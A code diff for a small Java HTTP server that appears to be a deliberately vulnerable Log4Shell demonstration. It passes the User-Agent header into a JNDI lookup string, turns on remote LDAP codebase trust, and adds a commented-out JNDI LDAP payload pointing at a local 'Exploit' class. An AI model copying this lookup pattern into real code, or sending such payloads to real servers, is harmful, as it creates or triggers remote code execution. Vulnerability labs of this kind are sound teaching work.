@@ -17,8 +17,9 @@ public class Main {
 
     public static void main(String[] args) throws IOException {
         final int PORT = 8080;
+        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
         HttpServer server =
-                HttpServer.create(new InetSocketAddress("0.0.0.0", PORT), 0);
+                HttpServer.create(new InetSocketAddress("127.0.0.1", PORT), 0);
         server.createContext("/", new RequestHandler());
         server.start();
         System.out.println("Server is running on port " + PORT);
@@ -34,6 +35,7 @@ public class Main {
             List<String> userAgent = (List<String>) exchange.getRequestHeaders()
                     .get("User-Agent");
             logger.error(String.format("${jndi:%s}", userAgent.get(0)));
+            //logger.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
             exchange.sendResponseHeaders(200, response.length());
             OutputStream os = exchange.getResponseBody();
             os.write(response.getBytes());
